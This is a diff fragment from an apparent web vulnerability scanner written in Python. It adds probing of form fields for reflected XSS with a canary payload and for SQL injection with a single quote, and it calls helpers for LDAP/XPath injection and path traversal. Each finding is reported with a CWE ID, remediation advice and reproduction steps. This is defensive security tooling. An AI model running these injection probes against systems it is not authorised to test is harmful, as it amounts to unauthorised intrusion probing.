+        base = {str(i["name"]): str(i.get("value") or "sharay") for i in inputs}
+        for pname in list(dict.fromkeys(str(i["name"]) for i in inputs))[:25]:
+            probe_key = f"{method}:{action_path}:{pname}"
+            if probe_key in seen_form_probes:
+                continue
+            seen_form_probes.add(probe_key)
+            ftag = hashlib.md5(probe_key.encode()).hexdigest()[:6]
+            fxss = f'"><sharay_canary_{form_canary}_{ftag}>'
+            aff = f"{destination.origin}{action_path}"
+            for _payload, _is_xss in ((fxss, True), ("'", False)):
+                params = {**base, pname: _payload}
+                try:
+                    if method == "POST":
+                        _, _, _fb, _ = _req(
+                            destination, allow_ip, "POST", action_path, body=urlencode(params),
+                            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout,
+                        )
+                    else:
+                        _, _, _fb, _ = _req(
+                            destination, allow_ip, "GET", f"{action_path}?{urlencode(params)}", timeout=timeout
+                        )
+                except Exception:
+                    continue
+                if _is_xss and fxss in _fb:
+                    findings.append(
+                        {
+                            "category": "cross_site_scripting",
+                            "severity": "high",
+                            "title": f"Reflected Cross-Site Scripting (XSS) in form field '{pname}'",
+                            "description": f"Form at {action_path} reflected a payload submitted in field '{pname}' unencoded.",
+                            "target_url": aff,
+                            "affected_url": aff,
+                            "fingerprint": hashlib.sha256(f"xssform_{destination.host}_{action_path}_{pname}".encode()).hexdigest(),
+                            "cwe_id": "CWE-79",
+                            "status": "suspected",
+                            "lifecycle_state": "CANDIDATE",
+                            "remediation": "Encode form-submitted values on output and enforce a strict Content-Security-Policy.",
+                            "poc": {
+                                "method": method, "url": aff, "parameter": pname, "payload": fxss,
+                                "reproduction_steps": f"Submit the form at {aff} with '{pname}' set to the payload; it renders unencoded.",
+                            },
+                            "evidence": [{"endpoint": action_path, "parameter": pname, "method": method, "vector": "form"}],
+                        }
+                    )
+                elif not _is_xss and re.search(_SQL_ERROR_REGEX, _fb):
+                    findings.append(
+                        {
+                            "category": "injection",
+                            "severity": "critical",
+                            "title": f"SQL Injection in form field '{pname}'",
+                            "description": f"Form at {action_path} returned a database syntax error when field '{pname}' was a single quote.",
+                            "target_url": aff,
+                            "affected_url": aff,
+                            "fingerprint": hashlib.sha256(f"sqliform_{destination.host}_{action_path}_{pname}".encode()).hexdigest(),
+                            "cwe_id": "CWE-89",
+                            "status": "suspected",
+                            "lifecycle_state": "CANDIDATE",
+                            "remediation": "Use parameterized queries; never concatenate form-submitted values into SQL.",
+                            "poc": {
+                                "method": method, "url": aff, "parameter": pname, "payload": "'",
+                                "reproduction_steps": f"Submit the form at {aff} with '{pname}' set to a single quote to observe a database error.",
+                            },
+                            "evidence": [{"endpoint": action_path, "parameter": pname, "method": method, "vector": "form"}],
+                        }
+                    )
+            # LDAP/XPath injection in this form field (W4).
+            def _form_send(val, ap=action_path, bp=base, pn=pname, m=method):
+                _ps = {**bp, pn: val}
+                if m == "POST":
+                    return _req(destination, allow_ip, "POST", ap, body=urlencode(_ps),
+                                headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=timeout)[2]
+                return _req(destination, allow_ip, "GET", f"{ap}?{urlencode(_ps)}", timeout=timeout)[2]
+            _lxf = _injection_error_probe(_form_send, pname, action_path, destination.origin)
+            if _lxf:
+                findings.append(_lxf)
+            # Path traversal in this form field (W2) -- reuses the form's own method/sibling values.
+            _lff = _lfi_probe(_form_send, pname, action_path, destination.origin)
+            if _lff:
+                findings.append(_lff)
 
     # 3. Header Security Audit (CSP, HSTS, X-Frame-Options, Information Leaks)
     try:
